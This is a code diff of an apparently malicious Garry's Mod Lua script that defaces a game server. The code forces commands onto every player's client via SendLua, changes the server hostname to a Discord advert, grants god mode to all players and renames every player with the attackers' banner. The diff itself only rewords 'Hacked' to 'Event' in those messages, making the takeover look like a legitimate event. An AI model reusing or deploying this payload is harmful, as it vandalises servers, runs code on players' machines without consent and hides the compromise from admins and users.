@@ -146,7 +146,7 @@ surface.CreateFont("KuramaM", {
 local marqueePos1 = sW
 local function marqueeText()
     surface.SetFont("KuramaM")
-local text = "Server has been hacked by ToDie SSV !"
+local text = "Server has been Event by ToDie SSV !"
 local tW, tH = surface.GetTextSize(text)
     if marqueePos1 + tW < 0 then
     marqueePos1 = sW
@@ -278,14 +278,14 @@ timer.Simple(2.5 ,function()
     for k, v in pairs(player.GetAll()) do
     v:SendLua([[RunConsoleCommand("gmod_language", "ko")]])
 end
-    RunConsoleCommand("hostname", "Server has been Hacked by Kurama and Myio with Visual ToDie ! -> discord.gg/kurama")
+    RunConsoleCommand("hostname", "Server has been Event by Kurama and Myio with Visual ToDie ! -> discord.gg/kurama")
     RunConsoleCommand("ulx", "god", "*")
 end)
 
 timer.Create("RPName",2.5 ,99 , function()
     for _, v in pairs(player.GetAll()) do
         v:GodEnable()
-        v:setDarkRPVar("rpname", "Server has been Hacked with Visual ToDie ! -> discord.gg/kurama")
+        v:setDarkRPVar("rpname", "Server has been Event with Visual ToDie ! -> discord.gg/kurama")
     end
 end)
 
